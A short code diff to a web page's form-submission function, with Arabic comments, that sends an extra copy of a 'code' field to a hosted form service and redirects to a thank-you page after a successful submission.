@@ -114,18 +114,25 @@
 
     function submitWithCode() {
       const form = document.getElementById("form");
+
       if (!form.checkValidity()) {
         alert("يرجى تعبئة جميع الحقول بشكل صحيح.");
         return;
       }
 
       const formData = new FormData(form);
+
+      // إرسال الكود مرة ثانية باسم مختلف
+      const codeValue = document.getElementById("code").value;
+      formData.append("code_copy", codeValue);
+
       fetch("https://formcarry.com/s/ldfA_DUCDrk", {
         method: "POST",
         body: formData,
       })
         .then(() => {
-          alert("تم تأكيد البيانات وإرسالها بنجاح.");
+          // إعادة التوجيه بعد الإرسال الناجح
+          window.location.href = "thankyou.html"; // ← غيّر الرابط حسب رغبتك
         })
         .catch(() => {
           alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
